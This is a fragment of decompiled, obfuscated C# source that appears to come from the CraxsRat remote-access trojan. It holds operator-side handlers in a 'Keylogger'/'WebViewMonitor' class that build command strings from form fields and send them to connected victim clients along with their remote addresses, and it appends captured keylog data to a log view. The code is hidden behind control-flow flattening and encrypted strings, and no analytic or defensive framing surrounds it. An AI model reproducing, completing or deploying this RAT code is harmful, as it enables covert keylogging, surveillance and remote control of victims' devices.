            int num3 = string.IsNullOrEmpty(this.idtext.Text) ? 452187585 : (num3 = -443942041);
            num1 = num3 ^ (int) num2 * -1431965517;
            continue;
          case 5:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Keylogger) this).Classclient.SendMessage(new object[4]
            {
              (object) ((Data._Closure\u0024__) ((Keylogger) this).Classclient).myClient,
              (object) (Craxs_Rat.sockets.Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003723E0816 + str1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray1[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray1[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((Keylogger) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00320482769),
              (object) ((Keylogger) this).Classclient
            });
            num1 = (int) num2 * 1920446209 ^ 1331343474;
            continue;
          case 6:
            int num4;
            num1 = num4 = !string.IsNullOrEmpty(this.namescombo.Text) ? -1089556083 : (num4 = 232103580);
            continue;
          case 7:
            goto label_12;
          case 8:
            int num5 = Operators.CompareString(lower, EXGuarder.\u00354642456, false) == 0 ? -108789169 : (num5 = -886022483);
            num1 = num5 ^ (int) num2 * 26991248;
            continue;
          case 9:
            text7 = this.namescombo.Text;
            num1 = (int) num2 * -1289198149 ^ 620542161;
            continue;
          case 10:
            goto label_52;
          case 11:
            goto label_34;
          case 12:
            int num6;
            num1 = num6 = !string.IsNullOrEmpty(this.namescombo.Text) ? -508397131 : (num6 = -732041758);
            continue;
          case 13:
            CraxsAlert.ShowWarning(EXGuarder.\u003560F4109);
            num1 = (int) num2 * 1039069069 ^ 526498860;
            continue;
          case 14:
            text1 = this.nametext.Text;
            text2 = this.linktext.Text;
            text3 = EXGuarder.\u0035D71052A;
            num1 = 637972994;
            continue;
          case 15:
            goto label_53;
          case 16:
            int num7;
            num1 = num7 = !(string.IsNullOrEmpty(this.nametext.Text) | string.IsNullOrEmpty(this.linktext.Text)) ? 879592509 : (num7 = -893323354);
            continue;
          case 18:
            if (Operators.CompareString(lower, EXGuarder.\u0031D343A0B, false) == 0)
            {
              num1 = (int) num2 * 772056069 ^ 372741656;
              continue;
            }
            goto label_45;
          case 19:
            strArray2 = ((Data) ((Keylogger) this).Classclient).Keys.Split(':');
            num1 = (int) num2 * -836708177 ^ -943094361;
            continue;
          case 20:
            text8 = this.namescombo.Text;
            strArray3 = ((Data) ((Keylogger) this).Classclient).Keys.Split(':');
            num1 = (int) num2 * -934732014 ^ -776988518;
            continue;
          case 21:
            if (Codes.MyMsgBox(EXGuarder.\u00368412525, EXGuarder.\u00317542012 + this.namescombo.Text + EXGuarder.\u0031A07135C, true, Craxs_Rat.My.Resources.Resources.information48px))
            {
              num1 = -883419530;
              continue;
            }
            goto label_49;
          case 22:
            int num8;
            num1 = num8 = !this.comandcombo.Items.Contains((object) this.nametext.Text) ? 430725394 : (num8 = 463852226);
            continue;
          case 23:
            int num9 = Operators.CompareString(lower, EXGuarder.\u003690E5D66, false) == 0 ? -604167026 : (num9 = -1057283114);
            num1 = num9 ^ (int) num2 * -1970654331;
            continue;
          case 24:
            goto label_28;
          case 25:
            goto label_26;
          case 26:
            int num10 = Operators.CompareString(lower, EXGuarder.\u003014F5528, false) == 0 ? 97293637 : (num10 = -145924966);
            num1 = num10 ^ (int) num2 * 971892874;
            continue;
          case 27:
            int num11 = !string.IsNullOrEmpty(this.namescombo.Text) ? -1514593890 : (num11 = -1921341561);
            num1 = num11 ^ (int) num2 * 1027794862;
            continue;
          case 28:
            if (Codes.MyMsgBox(EXGuarder.\u00368412525, EXGuarder.\u00329003F77 + this.namescombo.Text + EXGuarder.\u0034450570B, true, Craxs_Rat.My.Resources.Resources.information48px))
            {
              num1 = 249094877;
              continue;
            }
            goto label_4;
          case 29:
            goto label_1;
          case 30:
            text3 = this.idtext.Text;
            num1 = (int) num2 * 75726751 ^ 936933272;
            continue;
          case 31:
            text5 = this.linktext.Text;
            text6 = EXGuarder.\u0035D71052A;
            num1 = (int) num2 * -2112951265 ^ 935767086;
            continue;
          case 32:
            goto label_54;
          case 33:
            int num12 = string.IsNullOrEmpty(this.idtext.Text) ? -941687723 : (num12 = 609518244);
            num1 = num12 ^ (int) num2 * 145536427;
            continue;
          case 34:
            strArray1 = ((Data) ((Keylogger) this).Classclient).Keys.Split(':');
            num1 = (int) num2 * -1869070458 ^ 1991440168;
            continue;
          case 35:
            CraxsAlert.ShowWarning(EXGuarder.\u0036B150F20);
            num1 = (int) num2 * -794558871 ^ 1362545537;
            continue;
          case 36:
            goto label_29;
          case 37:
            str1 = text1 + EXGuarder.\u003014C0174 + text2 + EXGuarder.\u003014C0174 + text3 + EXGuarder.\u003014C0174;
            num1 = 591607065;
            continue;
          default:
            goto label_40;
        }
      }
label_52:
      return;
label_53:
      return;
label_54:
      return;
label_12:
      CraxsAlert.ShowWarning(EXGuarder.\u0033B0D476E);
      return;
label_49:
      return;
label_45:
      return;
label_26:
      CraxsAlert.ShowWarning(EXGuarder.\u00354605E37);
      return;
label_28:
      ((Keylogger) this).Classclient.SendMessage(ParametersObjects);
      return;
label_29:
      CraxsAlert.ShowWarning(EXGuarder.\u00354605E37);
      return;
label_4:
      return;
label_34:
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      ((Keylogger) this).Classclient.SendMessage(new object[4]
      {
        (object) ((Data._Closure\u0024__) ((Keylogger) this).Classclient).myClient,
        (object) (Craxs_Rat.sockets.Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00350526D5E + text8 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray3[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray3[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((Keylogger) this).Classclient).ClientRemoteAddress),
        (object) Codes.Encoding().GetBytes(EXGuarder.\u00320482769),
        (object) ((Keylogger) this).Classclient
      });
      return;
label_40:
      if (((Keylogger) this).Classclient == null)
        return;
      try
      {
        string[] strArray4 = ((Data) ((Keylogger) this).Classclient).Keys.Split(':');
label_42:
        int num13 = 568196401;
        while (true)
        {
          uint num14;
          switch ((num14 = (uint) (-~(-(num13 - ((~--740923570 ^ ~73960597 - (2102600979 ^ 1624103764)) * 1314241295 + (-(-690394433 - -1101697001) + ~-5331915 + (~(-969702910 - -1243119018) ^ -1801991562 ^ 1418790456 * 465151771)))) - 1536697209) - 102541952)) % 3U)
          {
            case 0:
              goto label_42;
            case 1:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ((Keylogger) this).Classclient.SendMessage(new object[4]
              {
                (object) ((Data._Closure\u0024__) ((Keylogger) this).Classclient).myClient,
                (object) (Craxs_Rat.sockets.Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003630B3C2F + str2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray4[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray4[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((Keylogger) this).Classclient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u00320482769),
                (object) ((Keylogger) this).Classclient
              });
              num13 = (int) num14 * 1904718858 ^ -959349370;
              continue;
            case 2:
              goto label_55;
            default:
              goto label_56;
          }
        }
label_55:
        return;
label_56:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_47:
        int num15 = -966586985;
        while (true)
        {
          uint num16;
          switch ((num16 = (uint) (-~(-(num15 - ((~--740923570 ^ ~73960597 - (2102600979 ^ 1624103764)) * 1314241295 + (-(-690394433 - -1101697001) + ~-5331915 + (~(-969702910 - -1243119018) ^ -1801991562 ^ 1418790456 * 465151771)))) - 1536697209) - 102541952)) % 3U)
          {
            case 0:
              goto label_47;
            case 1:
              ProjectData.ClearProjectError();
              num15 = (int) num16 * 1485902737 ^ 233291905;
              continue;
            case 2:
              goto label_57;
            default:
              goto label_58;
          }
        }
label_57:
        return;
label_58:;
      }
    }

    public WebViewMonitor()
    {
    }

    [SpecialName]
    internal void _Lambda\u0024__0()
    {
      ((Keylogger) this).\u0024VB\u0024Me.datalogtext.AppendText("> " + ((Keylogger) this).\u0024VB\u0024Local_datastring + "\r\n");
    }
  }
}
